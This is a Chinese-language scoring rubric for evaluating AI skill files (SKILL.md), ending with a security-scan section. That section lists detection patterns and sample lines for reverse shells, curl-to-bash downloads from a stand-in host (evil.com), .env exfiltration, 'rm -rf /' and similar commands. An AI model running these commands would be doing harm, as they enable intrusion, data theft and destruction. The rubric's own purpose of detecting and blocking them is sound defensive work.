# Skill 评分规则详细说明

本文件包含 skill-evaluator 的详细评分规则，用于对 SKILL.md 文件进行五维度评估。

---

## 一、结构规范 (Structure) — 权重 20%

### 1.1 Frontmatter 格式 (20 分)

**满分标准**：
```yaml
---
name: skill-name
description: "清晰的功能描述，包含触发条件"
---
```

**扣分规则**：
- 缺少 frontmatter：-20 分
- 缺少 `name` 字段：-10 分
- `name` 格式不正确（含大写/空格/特殊字符）：-5 分
- 缺少 `description` 字段：-10 分
- 使用中文引号而非英文引号：-2 分

### 1.2 章节标题结构 (20 分)

**满分标准**：
- 使用 H2 (`##`) 作为主要章节
- 使用 H3 (`###`) 作为子章节
- 章节之间有清晰的逻辑顺序
- 标题简洁明了（< 20 字）

**扣分规则**：
- 没有使用 markdown 标题：-20 分
- 标题层级混乱（如 H2 直接跳到 H4）：-5 分
- 标题过长或含义模糊：-5 分
- 章节之间缺乏逻辑关联：-10 分

### 1.3 Intent/使用场景 (20 分)

**满分标准**：
- 明确说明 skill 的用途
- 列出触发条件（"当用户要求..."）
- 说明适用的文件类型/场景

**扣分规则**：
- 没有 Intent 或使用场景说明：-20 分
- 有说明但触发条件不明确：-10 分
- 没有说明适用的文件类型：-5 分

### 1.4 执行步骤/流程 (20 分)

**满分标准**：
- 有明确的 Step 1, Step 2... 或编号列表
- 每个步骤有清晰的输入/输出
- 步骤之间有逻辑顺序
- 包含边界条件处理

**扣分规则**：
- 没有执行步骤：-20 分
- 步骤模糊（如"分析代码"没有说明如何分析）：-10 分
- 步骤顺序混乱：-5 分
- 没有边界条件处理：-5 分

### 1.5 输出格式定义 (20 分)

**满分标准**：
- 有明确的输出模板
- 使用代码块展示输出格式
- 输出结构清晰（表格、列表等）

**扣分规则**：
- 没有输出格式定义：-20 分
- 有定义但不够具体：-10 分
- 没有使用代码块展示：-5 分

---

## 二、描述质量 (Description) — 权重 20%

### 2.1 Description 功能说明 (25 分)

**满分标准**：
- 一句话说清楚 skill 做什么
- 使用第三人称（"用于..."、"当用户..."）
- 不包含实现细节

**扣分规则**：
- description 为空或过于简单（< 10 字）：-25 分
- 使用第一人称（"我帮你..."）：-5 分
- 包含实现细节而非功能描述：-10 分
- 描述模糊（如"帮助写代码"）：-15 分

### 2.2 Description 触发条件 (25 分)

**满分标准**：
- 明确说明何时触发（"当用户要求审查代码时"）
- 列出具体的触发关键词

**扣分规则**：
- 没有触发条件：-25 分
- 触发条件过于宽泛（如"任何时候"）：-15 分
- 触发条件不明确：-10 分

### 2.3 标题质量 (25 分)

**满分标准**：
- 简洁有力（< 30 字）
- 体现核心功能
- 有吸引力

**扣分规则**：
- 标题过长（> 50 字）：-10 分
- 标题与功能不符：-15 分
- 标题过于技术化，不易理解：-5 分

### 2.4 使用示例 (25 分)

**满分标准**：
- 有具体的使用示例
- 示例覆盖主要使用场景
- 示例可直接复制使用

**扣分规则**：
- 没有使用示例：-25 分
- 示例过于简单：-10 分
- 示例不可操作：-15 分

---

## 三、内容完整性 (Content) — 权重 25%

### 3.1 输入/输出定义 (20 分)

**满分标准**：
- 明确说明输入是什么（文件类型、参数等）
- 明确说明输出是什么（报告格式、文件等）
- 有示例输入/输出

**扣分规则**：
- 没有输入定义：-10 分
- 没有输出定义：-10 分
- 定义模糊：-5 分

### 3.2 边界条件处理 (20 分)

**满分标准**：
- 处理文件不存在的情况
- 处理格式错误的情况
- 处理空文件的情况
- 有明确的错误提示

**扣分规则**：
- 没有边界条件处理：-20 分
- 只处理部分边界条件：-10 分
- 错误提示不清晰：-5 分

### 3.3 检查规则/清单 (20 分)

**满分标准**：
- 有详细的检查规则列表
- 规则分类清晰
- 规则可操作（不是"注意质量"这种模糊规则）

**扣分规则**：
- 没有检查规则：-20 分
- 规则过于模糊：-10 分
- 规则分类混乱：-5 分

### 3.4 严重级别/优先级 (20 分)

**满分标准**：
- 有明确的严重级别定义（P0/P1/P2/P3）
- 每个级别有判定标准
- 有示例说明

**扣分规则**：
- 没有严重级别定义：-20 分
- 有定义但没有判定标准：-10 分
- 级别划分不合理：-5 分

### 3.5 参考文件 (20 分)

**满分标准**：
- 有 references/ 目录
- 参考文件内容详细
- 主文件正确引用参考文件

**扣分规则**：
- 没有参考文件：-10 分（不是必须，但有的话加分）
- 参考文件内容空洞：-10 分
- 引用路径错误：-20 分

---

## 四、实用性 (Usability) — 权重 20%

### 4.1 触发条件明确性 (25 分)

**满分标准**：
- 触发关键词具体（"审查代码"、"检查质量"）
- 不易与其他 skill 冲突
- 有明确的排除条件（"不处理..."）

**扣分规则**：
- 触发条件过于宽泛：-15 分
- 容易误触发：-10 分
- 没有排除条件：-5 分

### 4.2 执行步骤可操作性 (25 分)

**满分标准**：
- 步骤具体（"读取 package.json"而非"分析项目"）
- 有具体的命令或代码示例
- 不依赖模糊的判断

**扣分规则**：
- 步骤模糊：-15 分
- 没有具体命令：-10 分
- 依赖主观判断：-5 分

### 4.3 输出格式可读性 (25 分)

**满分标准**：
- 使用表格展示结构化数据
- 使用代码块展示代码
- 有清晰的标题层级
- 有摘要/总结

**扣分规则**：
- 输出格式混乱：-15 分
- 没有使用表格/代码块：-10 分
- 缺少摘要：-5 分

### 4.4 多场景支持 (25 分)

**满分标准**：
- 支持多种使用模式（如全量/增量/定向）
- 有模式切换说明
- 每种模式有独立的使用示例

**扣分规则**：
- 只支持单一模式：-15 分
- 模式切换不清晰：-10 分

---

## 五、安全性 (Safety) — 权重 15%

### 5.1 危险操作检查 (30 分)

**满分标准**：
- 不执行 `rm -rf`、`sudo` 等危险命令
- 不修改系统文件
- 不执行未经验证的外部脚本

**扣分规则**：
- 包含危险命令：-30 分
- 可能修改系统文件：-20 分
- 执行外部脚本无验证：-15 分

### 5.2 敏感文件检查 (30 分)

**满分标准**：
- 不读取 `.env`、`credentials.json` 等敏感文件
- 不在输出中暴露敏感信息
- 有明确的文件范围限制

**扣分规则**：
- 可能读取敏感文件：-30 分
- 可能暴露敏感信息：-20 分
- 没有文件范围限制：-10 分

### 5.3 范围限制 (40 分)

**满分标准**：
- 明确限制操作范围（只操作指定文件/目录）
- 有排除列表（不处理哪些文件）
- 不越权操作

**扣分规则**：
- 没有范围限制：-40 分
- 范围限制不明确：-20 分
- 可能越权操作：-30 分

## 六、脚本安全扫描（独立安全检查项）

> **重要**：脚本安全扫描是独立于五维度评分的安全检查。发现 P0 级威胁时，**无论其他维度得分多高，综合等级直接降为 D（不安全）**。

### 6.1 全文件扫描策略

**核心原则**：**不信任任何文件，扫描所有内容**。恶意代码可能藏在任何地方，不依赖标准目录结构。

**扫描范围**：skill 目录下的**每一个文件**，无论扩展名、无论位置。

| 优先级 | 文件类型 | 扫描方式 | 说明 |
|--------|----------|----------|------|
| P0 | 可执行文件（有 `+x` 权限） | 必须扫描 | 任何有执行权限的文件 |
| P0 | 脚本文件（`.sh`, `.py`, `.js`, `.rb`, `.pl`, `.bash`） | 必须扫描 | 常见脚本扩展名 |
| P0 | 隐藏文件（`.xxx`） | 必须扫描 | 以 `.` 开头的文件 |
| P1 | 无扩展名文件 | 必须扫描 | 检查 shebang 行判断类型 |
| P1 | SKILL.md 中的代码块 | 必须扫描 | 文档中嵌入的代码 |
| P2 | Markdown 文件（`.md`） | 扫描嵌入代码块 | `references/` 等目录 |
| P2 | 配置文件（`.json`, `.yaml`, `.toml`） | 扫描可疑值 | 可能包含恶意 URL |
| P3 | 其他文本文件 | 抽样扫描 | 兜底检查 |

### 6.2 文件内容特征检测

不仅检查扩展名，还检查**文件内容特征**：

| 特征 | 检测方式 | 说明 |
|------|----------|------|
| Shebang 行 | 文件首行 `#!/bin/bash`、`#!/usr/bin/env python` 等 | 识别脚本文件 |
| 脚本关键词 | `function`、`def `、`class `、`if __name__` 等 | 识别代码内容 |
| 编码特征 | `base64`、`eval`、`exec`、`\x` 十六进制串 | 识别混淆代码 |

### 6.3 关键检查点

| 检查点 | 说明 | 示例 |
|--------|------|------|
| 隐藏文件 | 以 `.` 开头的文件 | `.config.sh`、`.gitkeep`（可能是脚本） |
| 无扩展名文件 | 没有扩展名但有执行权限 | `setup`、`init`、`run` |
| 伪装扩展名 | 扩展名与内容不符 | `readme.txt` 内容是 bash 脚本 |
| 非标准目录 | 不在 `scripts/` 中的脚本 | `data/evil.sh`、`templates/backdoor.py` |
| SKILL.md 代码块 | 文档中嵌入的代码 | 示例中的 `curl \| bash` |
| 配置文件 | JSON/YAML 中的可疑值 | `"post-install": "curl evil.com \| bash"` |

### 6.4 P0 致命威胁检测模式

以下模式**发现即判定为不安全**，综合等级直接降为 D：

| 模式类别 | 检测正则/关键词 | 说明 |
|----------|-----------------|------|
| 数据外泄 | `curl.*-d.*@\.env`, `curl.*--data.*password`, `wget.*--post-file` | 将敏感数据发送到外部 |
| 反弹 Shell | `/dev/tcp/`, `bash -i >&`, `nc -e /bin/sh`, `python -c 'import socket'` | 建立反向连接 |
| 系统破坏 | `rm -rf /`, `rm -rf ~`, `mkfs\..*`, `dd if=/dev/zero of=/dev/sd` | 删除系统关键目录 |
| 权限提升 | `sudo chmod 777 /`, `chown root.*/`, `chmod u+s` | 获取 root 权限 |
| 隐蔽执行 | `curl.*\| bash`, `curl.*\| sh`, `wget.*\| sh`, `eval.*base64` | 下载并执行远程代码 |
| 加密混淆 | `eval.*base64.*-d`, `exec.*base64.*decode`, `\\x` 长串十六进制 | 使用编码隐藏恶意代码 |
| 键盘记录 | `xinput.*test`, `read -s.*\|.*curl`, `pynput.*keyboard` | 捕获用户输入 |

### 6.3 P1 高危行为检测模式

以下模式需要**明确说明用途**，否则视为可疑：

| 模式类别 | 检测关键词 | 正常场景 | 可疑场景 |
|----------|------------|----------|----------|
| 网络请求 | `curl`, `wget`, `fetch`, `requests.get/post`, `http.request` | 调用已知 API | 向未知域名发送数据 |
| 文件删除 | `rm`, `unlink`, `shutil.rmtree`, `os.remove` | 清理临时文件 | 删除用户数据 |
| 系统命令 | `sudo`, `chmod`, `chown`, `kill`, `pkill` | 修改文件权限 | 修改系统配置 |
| 环境变量 | `os.environ`, `process.env`, `printenv`, `cat .env` | 读取配置项 | 读取后发送到外部 |
| 进程执行 | `subprocess`, `exec`, `spawn`, `popen`, `child_process` | 调用本地工具 | 执行未知命令 |
| 定时任务 | `crontab`, `launchctl`, `systemd`, `at ` | 设置提醒 | 持久化恶意代码 |

### 6.4 P2 中危行为检测模式

以下模式需要**审查确认**：

| 模式类别 | 检测关键词 | 说明 |
|----------|------------|------|
| 文件写入 | `echo >`, `tee`, `open('w')`, `fs.writeFile` | 创建或修改文件 |
| 包安装 | `pip install`, `npm install`, `apt-get install` | 安装外部依赖 |
| 端口监听 | `nc -l`, `http.server`, `express.listen`, `socket.bind` | 启动网络服务 |
| 符号链接 | `ln -s`, `symlink`, `os.symlink` | 创建文件链接 |

### 6.5 安全评级规则

| 评级 | 条件 |
|------|------|
| **安全** | 无 P0/P1/P2 发现，或所有 P1/P2 均有合理说明 |
| **有风险** | 有 P1 发现且无法确认用途，或有多个 P2 发现 |
| **不安全** | 有任何 P0 发现 |

### 6.6 一票否决规则

- 发现 **任何 P0 级威胁** → 综合等级直接降为 **D（不安全）**
- 发现 **3 个以上 P1 级行为** → 安全性维度扣 50 分
- 发现 **5 个以上 P2 级行为** → 安全性维度扣 20 分

## 七、综合评分计算

```
综合得分 = 结构规范 × 0.20 
         + 描述质量 × 0.20 
         + 内容完整性 × 0.25 
         + 实用性 × 0.20 
         + 安全性 × 0.15

# 安全一票否决：
# 如果脚本扫描发现 P0 级威胁 → 综合等级直接降为 D
# 如果脚本扫描发现 3+ 个 P1 级行为 → 安全性维度额外扣 50 分
# 如果脚本扫描发现 5+ 个 P2 级行为 → 安全性维度额外扣 20 分
```

## 八、等级划分

| 等级 | 得分范围 | 说明 |
|------|----------|------|
| **S** | 90-100 | 优秀，可直接发布到 Skill 市场 |
| **A** | 80-89 | 良好，小幅优化即可达到优秀 |
| **B** | 70-79 | 合格，有明显改进空间 |
| **C** | 60-69 | 及格，需要较多优化 |
| **D** | <60 或发现 P0 威胁 | 不及格/不安全，建议重写或拒绝使用 |

## 九、常见问题清单

### 结构问题
- [ ] 缺少 frontmatter
- [ ] frontmatter 使用中文引号
- [ ] 章节标题层级混乱
- [ ] 缺少 Intent 说明

### 描述问题
- [ ] description 过于简单
- [ ] 没有触发条件
- [ ] 使用第一人称
- [ ] 标题过长

### 内容问题
- [ ] 没有输出格式定义
- [ ] 没有边界条件处理
- [ ] 检查规则模糊
- [ ] 没有严重级别定义

### 实用性问题
- [ ] 触发条件过于宽泛
- [ ] 执行步骤模糊
- [ ] 输出格式混乱
- [ ] 只支持单一模式

### 安全问题
- [ ] 包含危险命令
- [ ] 可能读取敏感文件
- [ ] 没有范围限制

### 脚本安全问题
- [ ] 包含 `scripts/` 目录但未在 SKILL.md 中说明
- [ ] 脚本中包含 `curl | bash` 等隐蔽下载执行
- [ ] 脚本中包含反弹 Shell 代码
- [ ] 脚本中包含数据外泄行为（上传 .env 等）
- [ ] 脚本中包含 `rm -rf /` 等系统破坏命令
- [ ] 脚本中包含 base64 编码的混淆代码
- [ ] 脚本向未知域名发送 HTTP 请求
- [ ] 脚本读取环境变量后发送到外部
- [ ] 脚本创建定时任务（crontab/launchctl）
- [ ] Git hooks 中包含恶意代码
